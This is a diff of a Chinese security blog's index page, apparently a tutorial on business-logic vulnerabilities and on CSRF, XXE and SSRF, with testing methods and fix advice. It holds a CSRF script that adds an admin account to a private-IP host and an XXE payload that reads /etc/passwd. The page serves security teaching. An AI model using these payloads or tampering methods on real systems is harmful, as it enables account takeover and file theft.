@@ -152,6 +152,244 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-安全进阶/业务逻辑漏洞的原理与挖掘" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/06/04/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98/">业务逻辑漏洞的原理与挖掘</a>
+    </h1>
+  
+
+        
+        <a href="/2021/06/04/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98/" class="archive-article-date">
+  	<time datetime="2021-06-04T12:22:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="业务逻辑漏洞的基本概念与挖掘思路"><a href="#业务逻辑漏洞的基本概念与挖掘思路" class="headerlink" title="业务逻辑漏洞的基本概念与挖掘思路"></a>业务逻辑漏洞的基本概念与挖掘思路</h2><p><img src="https://i.loli.net/2021/06/04/pfCOqRliLnTG6jF.png" alt="image-20210604203345583"></p>
+<h3 id="漏洞的产生原理"><a href="#漏洞的产生原理" class="headerlink" title="漏洞的产生原理"></a>漏洞的产生原理</h3><p>（1）安全漏洞产生原理通常分为<strong>实现漏洞、设计漏洞和配置漏洞</strong>三类，在WEB安全领域，之前我们提到的SQL注入、跨站脚本注入、文件包含、反序列化等漏洞都属于<strong>实现漏洞</strong>，而<strong>业务逻辑漏洞</strong>则通常被认为是<strong>设计漏洞。</strong></p>
+<p>（2）实现漏洞：是安全漏洞中最大的一类，大多数我们接触到的安全漏洞都属于这一类。实现类漏洞是由于在程序编码时不够严谨或对于安全性的考虑不周而产生的漏洞，缓冲区溢出类漏洞是最典型的实现漏洞。</p>
+<p>（3）设计漏洞：主要是指软件、硬件和固件在设计时对于安全性考虑不周导致的漏洞。例如F5 BIG-ip远程绕过验证漏洞是由于F5设备的SSH登录模块内置了一个可用于登录的秘钥文件，这个秘钥被泄露后任意获取该秘钥的用户都可以登录任意一台相关版本的设备。</p>
+<p>（4）配置漏洞：是由于软件的默认配置或者不恰当的配置导致的安全漏洞。例如弱口令或默认口令就是一种常见的配置漏洞。在Windows NT系统中，默认情况下会允许远程用户建立空会话，枚举系统里的各项NetBIOS信息。这里空会话指可以用空的用户名和空的口令通过NetBIOS协议登录到远程的Windows系统中。</p>
+<h3 id="业务逻辑漏洞的原理与分类"><a href="#业务逻辑漏洞的原理与分类" class="headerlink" title="业务逻辑漏洞的原理与分类"></a>业务逻辑漏洞的原理与分类</h3><p>（1）业务逻辑漏洞是一类特殊的安全漏洞，通常是业务逻辑设计不严谨导致的漏洞。由于业务逻辑漏洞与业务高度相关,大多数的业务逻辑漏洞没有通用的攻击特征，难以通过漏洞扫描的方式发现，也难以通过安全设备来防护，非常依赖手工漏洞挖掘的方式进行发现。</p>
+<p>（2）常见的业务逻辑漏洞分类：</p>
+<ul>
+<li>绕过验证：·主要指身份验证体系设计存在缺陷，可以使用某些技术手段绕过验证机制冒用他人身份。</li>
+<li>越权访问：主要指权限控制功能不严谨,使得系统用户可以访问或操作未授权的功能或数据。</li>
+<li>交易活动：交易漏洞指与交易相关功能设计不严谨，导致可免费、低价购买商品或重复领取奖励等。</li>
+<li>其他漏洞：·其他业务逻辑漏洞，如资源滥用等。</li>
+</ul>
+<h3 id="业务逻辑漏洞的挖掘思路"><a href="#业务逻辑漏洞的挖掘思路" class="headerlink" title="业务逻辑漏洞的挖掘思路"></a>业务逻辑漏洞的挖掘思路</h3><p><img src="https://i.loli.net/2021/06/04/xAzd89TqhvBJ1Ge.png" alt="image-20210604205002559"></p>
+<h2 id="绕过验证类漏洞的原理与挖掘"><a href="#绕过验证类漏洞的原理与挖掘" class="headerlink" title="绕过验证类漏洞的原理与挖掘"></a>绕过验证类漏洞的原理与挖掘</h2><p>（1）漏洞场景：涉及身份和权限验证的功能都可能存在绕过验证的漏洞，常见的场景包括登录、二次验证、辅助验证等</p>
+<p>（2）漏洞分类：客户端校验绕过、客户端验证信息泄露、客户端流程控制、操作目标篡改、参数篡改、暴力破解</p>
+<h3 id="客户端校验绕过"><a href="#客户端校验绕过" class="headerlink" title="客户端校验绕过"></a>客户端校验绕过</h3><p>（1）客户端校验是常见的一种校验方式，也就是在客户端校验用户的输入，将校验结果作为参数发送至服务端，或利用前端语言限制用户的非法输入和操作。面对此类的校验方法可以通过修改前端语言或者在传输中对参数进行篡改来绕过验证。<br>（2）常见的客户端验证方法</p>
+<ul>
+<li>使用HTML的input标签的属性限制用户输入的内容。</li>
+<li>使用javascript对用户输入进行校验，如果输入了非法内容自动清除或禁止用户提交表单。</li>
+<li>将用户数据在本地校验结果，作为请求参数或cookie提交。</li>
+<li>将用户需要进行校验的关键数据（如是否参与过活动，已参与活动的次数等）作为请求参数或cookie提交。</li>
+</ul>
+<p>（3）常见的测试方法</p>
+<ul>
+<li>使用浏览器的审查元素功能对HTML进行修改，解除HTML限制。</li>
+<li>在请求目标页面过程中使用burp拦截服务器的返回包，修改HTML和javascript，修改或解除相关校验机制。</li>
+<li>先输入正常的数据提交请求，然后使用burp拦截请求包，将数据修改为恶意数据后再提交。</li>
+<li>在提交请求的过程中使用burp拦截请求包，将校验结果或关键数据修改为满足要求的数据再提交。</li>
+</ul>
+<h3 id="客户端验证信息泄露"><a href="#客户端验证信息泄露" class="headerlink" title="客户端验证信息泄露"></a>客户端验证信息泄露</h3><p>（1）程序员在编写验证程序时有可能会将验证信息直接泄露到客户端，攻击者可以通过分析服务端的返回数据直接获得关键的验证信息从而完成验证。</p>
+<p>（2）客户端验证信息泄露途径</p>
+<ul>
+<li>直接将验证信息返回到客户端页面的源码中。</li>
+<li>将验证信息在接口中返回。</li>
+</ul>
+<p>（3）常见的测试方法</p>
+<ul>
+<li>通过访问HTML页面源码查看是否有验证信息。</li>
+<li>通过BURP拦截数据包跟踪验证过程，查看是否有验证信息。</li>
+</ul>
+<h3 id="客户端流程控制"><a href="#客户端流程控制" class="headerlink" title="客户端流程控制"></a>客户端流程控制</h3><p>（1）程序员在编写验证程序时有可能会验证结果返回到客户端，由客户端根据服务端提供的验证结果进行下一步操作，攻击者可以通过篡改验证结果或直接执行下一步操作实现绕过。</p>
+<p>（2）常见测试方法</p>
+<ul>
+<li>通过BURP拦截请求及响应数据包，找到验证成功和验证失败时返回包中的关键字，将验证失败的关键字篡改为验证成功时的关键字后再返回客户端。</li>
+<li>使用burp拦截请求及响应数据包，跟踪验证成功时触发的请求，尝试在验证失败的情况下直接构造相同的请求。</li>
+</ul>
+<h3 id="操作目标篡改"><a href="#操作目标篡改" class="headerlink" title="操作目标篡改"></a>操作目标篡改</h3><p>（1）如果某操作采用了连续身份校验机制或身份校验过程与操作过程分离，可以尝试在身份验证过程中替换身份校验对象或操作对象实现绕过验证。</p>
+<p>（2）常见的测试方法</p>
+<ul>
+<li>如果目标操作与身份校验功能分离，可以尝试在完成身份校验后修改操作目标。</li>
+</ul>
+<h3 id="参数篡改"><a href="#参数篡改" class="headerlink" title="参数篡改"></a>参数篡改</h3><p>（1）程序员在编写验证程序时有可能会对验证码字段进行正确性校验，但当验证码字段不存在或为空时就直接通过校验。</p>
+<p>（2）常见的测试方法</p>
+<ul>
+<li>通过BURP拦截请求数据包，将验证码字段值设置为空或删除后再提交请求。</li>
+</ul>
+<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>（1）暴力破解是利用大量猜测和穷举的方式来尝试获取用户口令的攻击方式，如果身份验证模块设计的不好，攻击者可以利用自动化攻击进行暴力破解，大大增加了密码被破解的风险。</p>
+<p>（2）常见的测试方法</p>
+<ul>
+<li>分别使用“有效的用户组合错误密码”和“不存在的用户”尝试进行身份验证操作，使用抓包工具跟踪验证流程，确认流程和返回信息是否一致，若两种情况下流程和返回信息完全一致，则认为无风险。</li>
+<li>使用常见的默认账号和默认密码尝试进行登录，若登录成功则记录为中风险或高风险漏洞（若账号具备管理权限记录为高风险漏洞，账号具备普通权限记录为中风险漏洞）。若应用具备账户枚举漏洞或其他暴力破解漏洞，可利用相关漏洞使用自动化工具进行测试，否则使用手动测试。</li>
+</ul>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>（1）所有验证在服务端进行，验证问题的答案不能以任何形式返回客户端中（如图片验证码答案、短信验证码、验证问题答案等）。</p>
+<p>（2）验证结果及下一步跳转操作由服务端直接进行。</p>
+<p>（3）应尽可能避免采用连续身份验证机制，无论采用何种验证机制，只有当所有的数据输入以后，才进行身份验证数据的验证。</p>
+<h2 id="越权访问类漏洞的原理与挖掘"><a href="#越权访问类漏洞的原理与挖掘" class="headerlink" title="越权访问类漏洞的原理与挖掘"></a>越权访问类漏洞的原理与挖掘</h2><p>（1）漏洞场景：权限控制是多数业务系统都拥有的功能，但权限控制功能如果在设计或实现存在缺陷，就有可能被攻击<br>者恶意利用。</p>
+<p>（2）漏洞分类：数据级越权（水平越权）、功能级越权（垂直越权）、不安全的权限控制框架</p>
+<table>
+<thead>
+<tr>
+<th align="center">数据级越权（水平越权）</th>
+<th align="center">功能级越权（垂直越权）</th>
+<th align="center">不安全的权限控制框架</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">基于用户ID、基于对象ID、基于文件名称</td>
+<td align="center">未登录的情况下、登录后</td>
+<td align="center">不安全的身份标识、不安全的角色标识、不安全的访问控制</td>
+</tr>
+</tbody></table>
+<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>（1）水平越权通常发生在对数据的增删改查等操作中，当一个请求中包含了请求对象标识，可以尝试将该对象标识该为其他请求对象的标识，如果能够成功访问， 可以认为存在水平越权漏洞，以下列举了常见可能发生水平越权漏洞的场景和测试方法。</p>
+<p>（2）常见的测试方法</p>
+<ul>
+<li>使用两个账号分别登录后访问相同的功能模块，记录正确的请求对象标识，使用burp拦截其中一个用户的请求，将其中的请求对象标识替换为另一个用户的请求对象标识，如果能够成功访问，则认为存在水平越权漏洞。</li>
+<li>分析请求对象标识的生成规律，<strong>采用burp或自动化脚本批量遍历请求对象标识，</strong>如果能够成功访问其他用户的数据，则认为存在水平越权漏洞。</li>
+</ul>
+<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>（1）垂直越权漏洞通常可以理解为功能级访问控制缺失，即某个用户在没有访问某个功能的权限的情况下可以成功的访问该功能。以下列举了常见垂直越权漏洞的场景和测试方法。</p>
+<p>（2）垂直越权问题场景描述</p>
+<ul>
+<li>用户在未登录的情况下可以访问某些需要登录才能访问的功能模块，包括WEB页面和API接口。</li>
+<li>一个低权限用户可以访问高权限用户才能访问的功能模块，包括WEB页面和API接口。</li>
+</ul>
+<p>（3）常见测试方法</p>
+<ul>
+<li>选择一些重要的WEB页面或API请求，通过burp记录请求包格式，并在没有登录的情况下尝试沟通相同的请求，如果能够成功请求，则认为存在垂直越权漏洞。</li>
+<li>选择一些只有高权限账户才能访问的重要的WEB页面或API请求，通过burp记录请求包格式，并在只使用了低权限账户登录的情况下尝试沟通相同的请求，如果能够成功请求，则认为存在垂直越权漏洞。</li>
+</ul>
+<h3 id="不安全的权限控制框架"><a href="#不安全的权限控制框架" class="headerlink" title="不安全的权限控制框架"></a>不安全的权限控制框架</h3><p>（1）权限控制框架决定了业务系统如何进行权限控制，若系统采用了不安全的权限控制框架，则会面临全局的权限控制失效。在测试过程中如果发现一个系统存在大量的越权访问漏洞，很有可能是权限控制框架出现了问题，此时应建议开发者重新调整权限控制框架，而不是简单的修复各个漏洞。</p>
+<p>（2）不安全的权限控制框架问题场景描述</p>
+<ul>
+<li>在用户成功登陆后给用户分配一个简单的用户ID存储在cookie 中（与用户名相同、较短的纯数字、或由字母+递增的纯数字），后续所有权限控制都基于用户ID来判断用户身份。</li>
+<li>在用户成功登陆后给用户分配一个简单的用户ID（与用户名相同、较短的纯数字、或由字母+递增的纯数字），后续所有的表单都会包含一个值为用户ID的隐藏字段随所有的请求一起提交，权限控制都基于用户ID来判断用户身份。</li>
+<li>采用javascript进行权限控制，即当用户访问没有权限的页面时服务端自动在页面上添加javascript代码跳转至其他页面。（目前已较为少见）</li>
+<li>将用户权限等级标识直接存储在cookie中，在请求时直接通过cookie中的权限等级判断用户权限。</li>
+</ul>
+<p>（3）常见的测试方法</p>
+<ul>
+<li>获取两个用户ID，使用其中一个用户ID登录系统，在提交请求时将用户ID篡改为另一个用户的用户ID，如果能够访问到另一个用户的数据，可以认为权限框架存在漏洞。</li>
+<li>使用burp拦截请求和响应数据包，如果发现用户在访问没有权限的页面时被加入了javascript跳转代码，通过burp删除相关代码后再返回给客户端，如果能成功访问相关页面，可以认为权限框架存在漏洞。</li>
+<li>使用低权限用户登录，并将cookie中的权限标识修改为高权限用户的权限标识，尝试访问高权限用户才能访问的页面，如果访问成功，可以认为权限框架存在漏洞。</li>
+</ul>
+<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>（1）采用成熟的权限管理框架，如spring security。</p>
+<p>（2）用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）优先采用在服务端关联session或加密后放在session中的方式获取。</p>
+<p>（3）必须采用表单或其他参数提交用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）时，应尽可能采用难以猜测的构造方式（增加字母及随机数字等）或采用复杂的加密算法加密后提交，应对客户端提交的凭证与会话的权限进行严格的验证，如提交的产品号码是否为隶属于登录用户的产品号码。</p>
+<p>（4）对管理功能模块进行严格的权限验证，如非必要建议不对互联网开放或进行网络层的访问控制。</p>
+<h2 id="交易活动类漏洞的原理与挖掘"><a href="#交易活动类漏洞的原理与挖掘" class="headerlink" title="交易活动类漏洞的原理与挖掘"></a>交易活动类漏洞的原理与挖掘</h2><p>（1）漏洞场景：交易活动类功能是WEB应用常见的功能之一，涉及使用资金、虚拟货币、积分等进行交易或参与活动类赢取奖励的功能，这些功能在设计实现时如果没有进行充分的安全性考虑，就会产生业务逻辑漏洞。交易活动类功能绕过出现业务逻辑漏洞，可能直接影响用户或平台的资金安全，给用户或平台造成较大的业务损失。</p>
+<p>（2）漏洞分类：重放攻击、数据篡改、流程绕过</p>
+<h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p>（1）重放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的。这种攻击会不断恶意或欺诈性地重复一个有效的数据传输。</p>
+<p>（2）常见的测试方法</p>
+<ul>
+<li>使用Burp对业务已处理的请求包进行两次或多次请求，进行原始回执包和重放回执包比较，两者一样说明重放成功。</li>
+</ul>
+<h3 id="数据篡改"><a href="#数据篡改" class="headerlink" title="数据篡改"></a>数据篡改</h3><p>（1）测试能否通过参数篡改的方式修改交易金额，实现非法获利，除了买卖以外，转账、打赏、红包、兑换等各类涉及资金、虚拟币、积分等功能的实现过程也需要进行本项测试。</p>
+<p>（2）常见的测试方法</p>
+<ul>
+<li>在买卖、兑换等交易过程使用抓包工具抓包跟踪交易流程，查看是否有涉及商品单价、订单总价等金额的参数，如果有则尝试将相关参数改为较小的金额、0或者负数，如果可以按照修改的金额交易成功实现非法获利，则记录高风险漏洞。</li>
+<li>在买卖、兑换等交易过程使用抓包工具抓包跟踪交易流程，查看是否有涉及商品数量的参数，如果有则尝试将相关参数改为0或负数，如果可以引发程序逻辑错误导致非法获利，则记录高风险漏洞。</li>
+<li>在转账、打赏、红包等交易过程使用抓包工具抓包跟踪，查看是否有涉及金额（或虚拟币、积分数量）的参数，如果有则尝试将相关参数修改为负数，如果可以引发程序逻辑错误导致非法获利，则记录高风险漏洞。</li>
+</ul>
+<h3 id="业务流程绕过"><a href="#业务流程绕过" class="headerlink" title="业务流程绕过"></a>业务流程绕过</h3><p>（1）客户端测试活动业务是否存在漏洞，能否在未满足活动参与条件的情况下参与活动或获得收益常见的客户端验证方法</p>
+<p>（2）常见的测试方法</p>
+<ul>
+<li>对于参与次数有限制的活动，采用绕过验证的方法，测试是否能够绕过限制重复参与活动，绕过成功则记录高风险漏洞。</li>
+<li>对于参与时间有限制的活动，采用绕过验证的方法，测试是否能够绕过限制提前参与活动或在活动结束后参与活动，绕过成功则记录高风险漏洞。</li>
+<li>除上述测试方法外，采用绕过验证的方法，测试是否能够在未满足活动参与条件的情况下参与活动或获得收益，绕过成功则记录高风险漏洞。</li>
+<li>对于活动类功能，查看活动参与过程是否具备防止批量化自动操作的人机识别手段（如短信验证码、图片验证码、语音识别、重力识别等），若无任何相关手段或相关手段可绕过，则记录存在中风险漏洞。</li>
+</ul>
+<h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>（1）交易类业务应充分考虑业务风险，应充分考虑流程和数据的防泄密、防篡改、防重放等安全问题。</p>
+<p>（2）交易类业务的关键参数，如单价、金额等关键参数必须在服务端生成或进行二次校验，不得直接使用用户可控数据。</p>
+<p>（3）资金类交易中，应对客户端提交的交易信息间的隶属关系进行严格校验，例如验证提交的账号和卡号间的隶属关系以及账号、卡号与登录用户之间的关系。</p>
+<p>（4）在客户确认交易信息后，再次提交交易信息（例如收款方、交易金额）时，应检查客户确认的信息与最终提交交易信息之间的一致性，防止在客户确认后交易信息被非法篡改或替换。</p>
+<h2 id="其他漏洞的原理与挖掘"><a href="#其他漏洞的原理与挖掘" class="headerlink" title="其他漏洞的原理与挖掘"></a>其他漏洞的原理与挖掘</h2><p>（1）漏洞场景：常见消息推送接口主要包括短信接口、邮件接口等向手机或邮箱发送消息推送的API接口，如果这些接口没有采取一些有效措施防止攻击者恶意调用，可以认为存在安全漏洞。</p>
+<p>（2）攻击者常见的恶意调用方式包括资源滥用和信息篡改者：</p>
+<ul>
+<li>资源滥用如短信炸弹、邮件炸弹等，使用自动化工具频繁调用接口，消耗系统资源，对用户进行骚扰。</li>
+</ul>
+<p>（3）漏洞分类：资源滥用</p>
+<ul>
+<li>短信验证码</li>
+<li>社交功能</li>
+</ul>
+<h3 id="资源滥用"><a href="#资源滥用" class="headerlink" title="资源滥用"></a>资源滥用</h3><p>（1）本项测试主要针对消息推送接口（短信接口、邮件接口等向手机或邮箱发送消息推送的API接口），测试这些接口能否被滥用或发送恶意消息。</p>
+<p>（2）常见的测试方法</p>
+<ul>
+<li>使用抓包工具跟踪消息推送接口的调用过程，如果满足以下要求（如业务或行业有相关规范要求以相关规范要求为准），则认为不存在本漏洞，如果仅满足部分要求、可以无限制使用自动化工具重复调用或限制措施可以通过绕过验证的方式绕过，则记录中风险漏洞：<ul>
+<li>接口调用有时间间隔限制且不小于一分钟</li>
+<li>接口调用有单位时间内调用次数限制，如每小时最多调用多少次或每天最多调用多少次。</li>
+</ul>
+</li>
+<li>使用抓包工具跟踪消息推送接口的调用过程，如果可以通过参数篡改等方式修改消息推送接口的推送的内容，则记录高风险漏洞。</li>
+</ul>
+<h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>（1）短信内容必须在服务端生成，不得由客户端控制。</p>
+<p>（2）在服务器端对短信发送功能进行限制，根据客户端请求的IP或目标号码，限制短信发送的总数量、单位时间内的数量、两次发送的间隔，如每天最多发送30条短信，每小时最多发送10条短信，任意两条短信之间发送的时间间隔需要达到1分钟以上。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/06/04/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-安全进阶/其他常见web漏洞的原理与实践" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -172,35 +410,189 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p><img src="https://i.loli.net/2021/05/18/fgMdmTUVkb3lv2Z.png" alt="image-20210518192126794"></p>
-<h3 id="CSRF–跨站请求伪造"><a href="#CSRF–跨站请求伪造" class="headerlink" title="CSRF–跨站请求伪造"></a>CSRF–跨站请求伪造</h3><p>XSS可以配合CSRF漏洞，完成进一步的攻击。</p>
-<p>XSS—利用xss获取其他用户的Cookie，然后使用对方的Cookie去访问网页，则此时该网页的登录用户则为对方的账号，修改密码，控制用户。为Cookie设置HTTPonly可以防止XSS注入获取用户的Cookie。</p>
-<p>XSS+CSRF—利用这两个漏洞修改对方的密码，然后进一步控制对方的用户—组合攻击的优点： 黑客无需向对方发送网址，只需要看到留言板（系统正常的功能），则恶意代码就会被触发（通过XSS漏洞而产生的，弥补了CSRF的缺点），然后利用CSRF伪造的脚本向网站发起请求，此时这个请求将会带上受害者本身的Cookie，不管XSS是否能获取到Cookie（Cookie是否设置了HTTPonly）此时的伪造脚本都会被执行。（利用CSRF弥补了XSS的缺点）</p>
-<p>CSRF—利用该漏洞，向对方发送恶意的链接，然后构造跨站请求伪造修改对方的密码，进一步控制对方用户—对方必须信任攻击者发送的网站，并且能够成功点击。</p>
-<p>防范：</p>
-<p>（1）referer：http请求包中存在该字段，表示的是从哪个网页访问到当前网页的。若referer的内容不是本网站，则推测可能遭遇了CSRF</p>
-<p>（2）二次校验：在关键的敏感网页加入验证码，需要输入正确的验证码才能进行操作。</p>
-<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>针对与XML文档中的外部实体实施的注入，全名为XML外部实体注入。</p>
-<p>XML：可扩展标记语言</p>
-<p>HTML：超文本标记语言</p>
-<p>XML中的标签是可扩展的，即可以自定义标签。</p>
-<p>在当前的DTD文档中声明实体：&lt;!ENTITY 实体名称 “Bill Gates”&gt;</p>
+        <h2 id="CSRF漏洞原理与利用"><a href="#CSRF漏洞原理与利用" class="headerlink" title="CSRF漏洞原理与利用"></a>CSRF漏洞原理与利用</h2><p>（1）跨站请求伪造。CSRF漏洞产生的原因主要是因为<strong>关键的敏感请求可被伪造发出</strong>，而服务端接收处理<strong>未进行二次校验。</strong></p>
+<ul>
+<li><strong>敏感请求</strong>：增删改等操作请求，如添加账号，修改密码，删除文章等。</li>
+<li><strong>二次校验</strong>：验证请求是由用户正常发起的校验方式，如图片和短信验证码，随机token，修改密码需同时提交旧密码等都属于二次校验。</li>
+</ul>
+<p>（2）XSS可以配合CSRF漏洞，完成进一步的攻击。</p>
+<ul>
+<li>XSS—利用xss获取其他用户的Cookie，然后使用对方的Cookie去访问网页，则此时该网页的登录用户则为对方的账号，修改密码，控制用户。为Cookie设置HTTPonly可以防止XSS注入获取用户的Cookie。</li>
+<li>XSS+CSRF—利用这两个漏洞修改对方的密码，然后进一步控制对方的用户—组合攻击的优点： 黑客无需向对方发送网址，只需要看到留言板（系统正常的功能），则恶意代码就会被触发（通过XSS漏洞而产生的，弥补了CSRF的缺点），然后利用CSRF伪造的脚本向网站发起请求，此时这个请求将会带上受害者本身的Cookie，不管XSS是否能获取到Cookie（Cookie是否设置了HTTPonly）此时的伪造脚本都会被执行。（利用CSRF弥补了XSS的缺点）</li>
+<li>CSRF—利用该漏洞，向对方发送恶意的链接，然后构造跨站请求伪造修改对方的密码，进一步控制对方用户—对方必须信任攻击者发送的网站，并且能够成功点击。</li>
+</ul>
+<pre><code class="html">&lt;script&gt;function loadXMLDoc()
+&#123;
+var xmlhttp=new XMLHttpRequest();
+xmlhttp.open(&quot;POST&quot;,&quot;http://192.168.14.137:80/admin/adminadd.php?id=3&quot;,true);
+xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+xmlhttp.send(&quot;name=lwphp&amp;passwd=123456&amp;remark= test&amp;mid=1&amp;adminsubmit=%CC%E1%BD%BB&quot;);
+&#125;
+loadXMLDoc();
+&lt;/script&gt;</code></pre>
+<p>（3）防范：</p>
+<ul>
+<li>referer：http请求包中存在该字段，表示的是从哪个网页访问到当前网页的。若referer的内容不是本网站，则推测可能遭遇了CSRF</li>
+<li>二次校验：在关键的敏感网页加入验证码，需要输入正确的验证码才能进行操作。</li>
+</ul>
+<h2 id="XXE注入漏洞原理"><a href="#XXE注入漏洞原理" class="headerlink" title="XXE注入漏洞原理"></a>XXE注入漏洞原理</h2><p>（1）XXE（XML External Entity attack）<strong>外部实体注入攻击</strong>。针对与XML文档中的外部实体实施的注入。</p>
+<ul>
+<li>XXE是一种注入攻击。</li>
+<li>程序在解析XML时，<strong>解析了XML中的外部实体引用。</strong></li>
+<li>若解析时没有禁止外部实体的加载，攻击者可以利用外部实体读取任意文件，进行内网探测，执行远程代码和拒绝服务攻击。</li>
+</ul>
+<p>（2）XML 是一种类似HTML的标记性语言，用来存储标记数据、定义数据类型。和html不同的是，xml的根元素和子元素是允许用户自定义的。</p>
+<ul>
+<li><p>XML：可扩展标记语言。HTML：超文本标记语言</p>
+</li>
+<li><p>XML中的标签是可扩展的，即可以自定义标签。</p>
+</li>
+</ul>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!-- 文档声明：&lt;?xml version=&quot;1.0&quot;?&gt;  --&gt;
+&lt;note&gt;                              &lt;!-- 根元素：note --&gt;
+&lt;to&gt;
+&lt;from&gt;GeorgeJohn&lt;/to&gt;&lt;/from&gt;        &lt;!-- 子元素：to、from、heading、body --&gt;
+&lt;heading&gt;Reminder&lt;/heading&gt;
+&lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;
+&lt;/note&gt;</code></pre>
+<p>（3）DTD（Document Type Definition）文档类型定义</p>
+<ul>
+<li>由于XML允许用户自定义标签，DTD则是用来规范和约束XML的书写。</li>
+<li>定义实体：定义实体就是为一段内容指定一个名称，使用时通过这个名称就可以引用其所代表的内容。</li>
+<li>在DTD文档中使用ENTITY关键字来声明一个实体，格式如下：</li>
+</ul>
+<pre><code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code></pre>
+<ul>
+<li>如声明实体b，b的内容为文档规范： <a target="_blank" rel="noopener" href="http://xx.com/1.dtd">http://xx.com/1.dtd</a></li>
+</ul>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE author [&lt;!ENTITY b SYSTEM &quot;http://xx.com/1.dtd&quot;&gt;]&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;</code></pre>
+<ul>
+<li>由于外部实体不仅仅支持http协议，还支持其他协议如file</li>
+</ul>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;</code></pre>
+<p>（4）在当前的DTD文档中声明实体：&lt;!ENTITY 实体名称 “Bill Gates”&gt;</p>
 <p>从外部的DTD文档声明实体：&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;—此时引用了外部的DTD文档，和文件包含有点类似。若此时外部DTD文档的值是用户可控的，则可能会产生XXE注入（XML外部实体注入）</p>
 <p>输出实体：&amp;实体名称;</p>
-<h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p>伪造服务端发起请求</p>
-<p>1.探测内网IP、端口信息</p>
-<p>2.探测内网的Web应用程序、语言环境</p>
-<p>3.利用SSRF攻击Web应用</p>
-<p>4.file协议读取文件</p>
-<p>探测内网需要结合Gopher协议</p>
-<h3 id="HTTP拆分攻击-CRLF注入"><a href="#HTTP拆分攻击-CRLF注入" class="headerlink" title="HTTP拆分攻击/CRLF注入"></a>HTTP拆分攻击/CRLF注入</h3><p>针对HTTP头部进行的注入（条件：前端输入的或用户可控的内容被放在HTTP头部中）</p>
+<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p>（1）SSRF（ Server-side Request Forgery ）服务端请求伪造。</p>
+<ul>
+<li>很多web应用都提供了<strong>从其他的服务器上获取数据的功能。</strong></li>
+<li>使用用户指定的URL，web应用可以<strong>获取图片，下载文件，读取文件内容等。</strong></li>
